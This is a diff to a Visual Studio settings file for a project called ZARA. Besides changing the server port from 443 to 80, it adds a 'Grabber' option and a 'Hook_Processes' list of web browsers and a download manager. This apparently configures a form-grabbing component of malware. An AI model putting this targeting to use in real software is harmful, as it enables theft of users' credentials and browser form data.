@@ -1,7 +1,5 @@
 ﻿<?xml version='1.0' encoding='utf-8'?>
-
-<SettingsFile xmlns="http://schemas.microsoft.com/VisualStudio/2004/01/settings" CurrentProfile="(Default)"
-              GeneratedClassNamespace="ZARA.Properties" GeneratedClassName="Settings">
+<SettingsFile xmlns="http://schemas.microsoft.com/VisualStudio/2004/01/settings" CurrentProfile="(Default)" GeneratedClassNamespace="ZARA.Properties" GeneratedClassName="Settings">
   <Profiles />
   <Settings>
     <Setting Name="FirstRun" Type="System.Boolean" Scope="User">
@@ -35,12 +33,31 @@
       <Value Profile="(Default)">11.0.0.0</Value>
     </Setting>
     <Setting Name="ServerPort" Type="System.UInt16" Scope="User">
-      <Value Profile="(Default)">443</Value>
+      <Value Profile="(Default)">80</Value>
     </Setting>
     <Setting Name="UpdateSettings" Type="System.Boolean" Scope="User">
       <Value Profile="(Default)">True</Value>
     </Setting>
     <Setting Name="ShowHost" Type="System.Boolean" Scope="User">
+      <Value Profile="(Default)">True</Value>
+    </Setting>
+    <Setting Name="Grabber" Type="System.Int32" Scope="User">
+      <Value Profile="(Default)">1</Value>
+    </Setting>
+    <Setting Name="Hook_Processes" Type="System.String" Scope="User">
+      <Value Profile="(Default)">firefox
+iexplore
+chrome
+opera
+safari
+rockmelt
+deepnet
+maxthon
+seamonkey
+idman
+dap</Value>
+    </Setting>
+    <Setting Name="AutoUpdate" Type="System.Boolean" Scope="User">
       <Value Profile="(Default)">True</Value>
     </Setting>
   </Settings>
